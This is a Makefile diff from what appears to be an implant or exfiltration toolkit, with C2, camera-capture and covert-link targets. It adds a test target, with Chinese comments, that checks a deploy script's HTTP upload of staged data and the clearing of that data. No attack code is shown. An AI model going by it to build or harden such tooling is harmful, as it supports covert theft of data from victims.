@@ -216,7 +216,16 @@ $(BUILD)/test_exfil_burst_cover: tests/test_exfil_burst_cover.c \
 	$(CC) $(CFLAGS) $< $(BUILD)/link_cover.o $(BUILD)/exfil_link.o \
 	  $(BUILD)/exfil.o -o $@ $(LATLIB) $(C2OBJS) $(P2PLIB)
 
-test: $(BUILD)/test_exfil $(BUILD)/test_cam_e2e $(BUILD)/test_exfil_circuit $(BUILD)/test_sched $(BUILD)/test_sched_gate $(BUILD)/test_task $(BUILD)/test_task_circuit $(BUILD)/test_link_cover $(BUILD)/test_task_cover $(BUILD)/test_cover_loop $(BUILD)/test_cover_circuit $(BUILD)/test_exfil_cover_circuit $(BUILD)/test_tol
+# deploy.sh 的 http 上传分支守卫：
+#   200  -> 必须送达且字节数一致，然后清空
+#   500  -> 必须 DIE 且保留落点
+#   000  -> 连接失败同样保留落点
+# 反向验证过：把清空移到上传之前，5 条断言变红（且 deploy.sh 自报"已上传
+# 1282048 字节 HTTP 200"、退出 0，而服务端收到 0 字节 —— 三方都不报错）。
+verify-upload:
+	@python3 tests/verify_upload.py
+
+test: verify-upload $(BUILD)/test_exfil $(BUILD)/test_cam_e2e $(BUILD)/test_exfil_circuit $(BUILD)/test_sched $(BUILD)/test_sched_gate $(BUILD)/test_task $(BUILD)/test_task_circuit $(BUILD)/test_link_cover $(BUILD)/test_task_cover $(BUILD)/test_cover_loop $(BUILD)/test_cover_circuit $(BUILD)/test_exfil_cover_circuit $(BUILD)/test_tol
 	./$(BUILD)/test_exfil
 	./$(BUILD)/test_cam_e2e
 	./$(BUILD)/test_exfil_circuit
